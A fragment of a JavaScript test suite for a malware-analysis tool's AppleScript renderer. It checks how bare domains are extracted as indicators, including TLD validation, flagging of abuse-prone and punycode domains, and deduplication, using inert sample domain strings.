      `expected domain ${d} in extracted IOCs; got: ${JSON.stringify(domains)}`);
  }
});

test('OsascriptRenderer: bare-domain extraction rejects version strings / invalid TLDs', () => {
  // tldts-backed validation rejects non-ICANN dotted identifiers even
  // though the looser regex matches their shape. Note: single-label
  // extensions that happen to be real ccTLDs (`.py` for Paraguay, `.sh`
  // for Saint Helena, `.io` for British Indian Ocean Territory) are
  // legitimately ICANN-assigned and will be accepted — this is the
  // cost of not maintaining a manual filename-vs-domain disambiguator.
  // The analyst can filter the sidebar if their corpus happens to
  // contain `main.py` / `script.sh` / etc.
  const text =
    'property _ver : "build.1.2.3"\n' +
    'property _nope : "thing.xyzzy"\n' +
    'property _num : "192.168.0.1"';
  const bytes = new TextEncoder().encode(text);
  const buffer = bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength);
  const renderer = new OsascriptRenderer();
  const findings = renderer.analyzeForSecurity(buffer, 'test.applescript');
  const domains = (findings.externalRefs || [])
    .filter(r => r.type === osCtx.IOC.DOMAIN)
    .map(r => r.url.toLowerCase());
  for (const bogus of ['build.1.2.3', '192.168.0.1']) {
    assert.ok(!domains.includes(bogus),
      `${bogus} must not be emitted as IOC.DOMAIN; got: ${JSON.stringify(domains)}`);
  }
  assert.ok(!domains.some(d => d.endsWith('.xyzzy')),
    `invalid TLD (.xyzzy) must be rejected; got: ${JSON.stringify(domains)}`);
});

test('pushBareDomain: mirrors abuse-suffix PATTERN flagging (emitUrlSiblings parity)', () => {
  const { pushBareDomain } = osCtx;
  const findings = { externalRefs: [] };
  pushBareDomain(findings, 'c2host.ngrok.io', { bucket: 'externalRefs' });
  const patterns = findings.externalRefs.filter(r => r.type === osCtx.IOC.PATTERN);
  assert.ok(patterns.some(r => /abuse-prone/.test(r.url || '')),
    `abuse-suffix PATTERN must fire for ngrok.io; got: ${JSON.stringify(host(patterns))}`);
});

test('pushBareDomain: mirrors punycode PATTERN flagging', () => {
  const { pushBareDomain } = osCtx;
  const findings = { externalRefs: [] };
  // xn--fsq.com == 北.com (Chinese for "north") — IDN/punycode.
  pushBareDomain(findings, 'xn--fsq.com', { bucket: 'externalRefs' });
  const patterns = findings.externalRefs.filter(r => r.type === osCtx.IOC.PATTERN);
  assert.ok(patterns.some(r => /Punycode\/IDN/.test(r.url || '')),
    `punycode PATTERN must fire; got: ${JSON.stringify(host(patterns))}`);
});

test('pushBareDomain: rejects sentinel-bearing domain', () => {
  const { pushBareDomain } = osCtx;
  const findings = { externalRefs: [] };
  const ret = pushBareDomain(findings, '\u27E8unresolved:_X\u27E9.example.com',
    { bucket: 'externalRefs' });
  assert.equal(ret, false);
  assert.equal(findings.externalRefs.length, 0);
});

test('pushBareDomain: dedupes repeat pushes of the same registrable domain', () => {
  const { pushBareDomain } = osCtx;
  const findings = { externalRefs: [] };
  // Three subdomains of the same registrable domain — tldts collapses
  // to `example.pro` so all three push into the same row.
  pushBareDomain(findings, 'a.example.pro', { bucket: 'externalRefs' });
  pushBareDomain(findings, 'b.example.pro', { bucket: 'externalRefs' });
  pushBareDomain(findings, 'example.pro',   { bucket: 'externalRefs' });
  const domains = findings.externalRefs.filter(r => r.type === osCtx.IOC.DOMAIN);
  assert.equal(domains.length, 1, `expected exactly one DOMAIN row; got: ${JSON.stringify(host(domains))}`);
  assert.equal(domains[0].url, 'example.pro');
});

test('pushBareDomain: accepts clean .pro / .lol domain (the user-reported case)', () => {
  const { pushBareDomain, IOC } = osCtx;
  const findings = { externalRefs: [] };
  for (const d of ['9sxgrev.pro', 'axj0tw9.lol']) {
    const ret = pushBareDomain(findings, d, { bucket: 'externalRefs', severity: 'info' });
    assert.equal(ret, true, `expected ${d} to push; returned: ${ret}`);
  }
  const domains = findings.externalRefs
    .filter(r => r.type === IOC.DOMAIN)
    .map(r => r.url);
  assert.ok(domains.includes('9sxgrev.pro'),
    `expected 9sxgrev.pro; got: ${JSON.stringify(domains)}`);
  assert.ok(domains.includes('axj0tw9.lol'),
    `expected axj0tw9.lol; got: ${JSON.stringify(domains)}`);
});
